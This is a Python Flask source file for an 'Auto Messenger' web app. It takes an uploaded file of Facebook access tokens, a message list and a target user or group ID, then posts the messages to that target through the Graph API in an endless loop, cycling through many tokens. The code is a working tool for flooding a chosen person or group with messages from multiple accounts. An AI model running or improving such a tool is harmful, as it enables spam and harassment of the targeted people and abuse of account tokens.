from flask import Flask, request, render_template_string
import os
import threading
import time
import requests

app = Flask(__name__)

# Data directory
DATA_DIR = "data"
os.makedirs(DATA_DIR, exist_ok=True)

TOKEN_FILE = os.path.join(DATA_DIR, "tokens.txt")
MESSAGE_FILE = os.path.join(DATA_DIR, "messages.txt")
TIME_FILE = os.path.join(DATA_DIR, "time.txt")
TARGET_FILE = os.path.join(DATA_DIR, "target.txt")

# Function to save uploaded files
def save_file(file, path):
    with open(path, "wb") as f:
        f.write(file.read())

# Function to send messages
def send_messages():
    try:
        with open(TOKEN_FILE, "r") as f:
            tokens = [line.strip() for line in f.readlines() if line.strip()]

        with open(MESSAGE_FILE, "r") as f:
            messages = [line.strip() for line in f.readlines() if line.strip()]

        with open(TIME_FILE, "r") as f:
            delay = int(f.read().strip())

        with open(TARGET_FILE, "r") as f:
            target_id = f.read().strip()

        if not (tokens and messages and target_id):
            print("[!] Tokens, Messages, या Target ID missing है!")
            return

        while True:
            for token, message in zip(tokens, messages):
                url = f"https://graph.facebook.com/v15.0/{target_id}/messages"
                headers = {'User-Agent': 'Mozilla/5.0'}
                payload = {'access_token': token, 'message': message}

                response = requests.post(url, json=payload, headers=headers)
                if response.ok:
                    print(f"[+] मैसेज भेजा गया: {message}")
                else:
                    print(f"[x] फेल हुआ: {response.status_code} {response.text}")

                time.sleep(delay)

    except Exception as e:
        print(f"[!] एरर: {e}")

# HTML Template
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Messenger</title>
    <style>
        body { background-color: black; color: white; font-family: Arial, sans-serif; text-align: center; }
        .container { background: #222; max-width: 400px; margin: 50px auto; padding: 20px; border-radius: 10px; }
        h1 { color: #ffcc00; }
        form { display: flex; flex-direction: column; }
        label { text-align: left; font-weight: bold; margin: 10px 0 5px; }
        input, button { padding: 10px; border-radius: 5px; margin-bottom: 10px; }
        button { background-color: #ffcc00; color: black; border: none; cursor: pointer; }
        button:hover { background-color: #ff9900; }
        footer { margin-top: 20px; color: #777; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Auto Messenger</h1>
        <form action="/" method="post" enctype="multipart/form-data">
            <label>Tokens File (tokens.txt):</label>
            <input type="file" name="token_file" required>

            <label>Messages File (messages.txt):</label>
            <input type="file" name="message_file" required>

            <label>Target ID (Group या User ID):</label>
            <input type="text" name="target_id" required>

            <label>Interval (सेकंड में):</label>
            <input type="number" name="delay" value="5" min="1">

            <button type="submit">Start Messaging</button>
        </form>
        <footer>© 2025 Auto Messenger</footer>
    </div>
</body>
</html>
"""

# Flask route to render HTML form
@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        token_file = request.files.get("token_file")
        message_file = request.files.get("message_file")
        target_id = request.form.get("target_id")
        delay = request.form.get("delay", 5)

        if token_file and message_file and target_id:
            save_file(token_file, TOKEN_FILE)
            save_file(message_file, MESSAGE_FILE)
            with open(TIME_FILE, "w") as f:
                f.write(str(delay))
            with open(TARGET_FILE, "w") as f:
                f.write(target_id)

            threading.Thread(target=send_messages, daemon=True).start()

    return render_template_string(HTML_TEMPLATE)

# Start Flask server
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 3000))
    app.run(host='0.0.0.0', port=port)
